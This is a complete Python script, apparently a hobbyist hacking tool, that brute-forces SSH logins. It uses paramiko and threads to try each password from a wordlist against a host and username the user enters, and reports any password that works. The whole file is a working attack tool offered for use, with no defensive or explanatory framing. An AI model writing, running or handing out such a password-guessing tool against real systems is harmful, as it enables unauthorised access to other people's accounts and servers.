import paramiko
import sys
import os
import socket
import termcolor
import threading
import time


stop_flag = 0

def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found password: {} , for account: {}'.format(password, username)), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect login: {}'.format(password)), 'red'))
    ssh.close()


host = input('[+] Target address: ')
username = input('[+] SSH username: ')
input_file = input('[+] Passwords file: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] That file/path doesn\'t exist')
    sys.exit(1)

print('* * * Starting threaded SSH bruteforce on {} with account: {} * * *'.format(host, username))

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
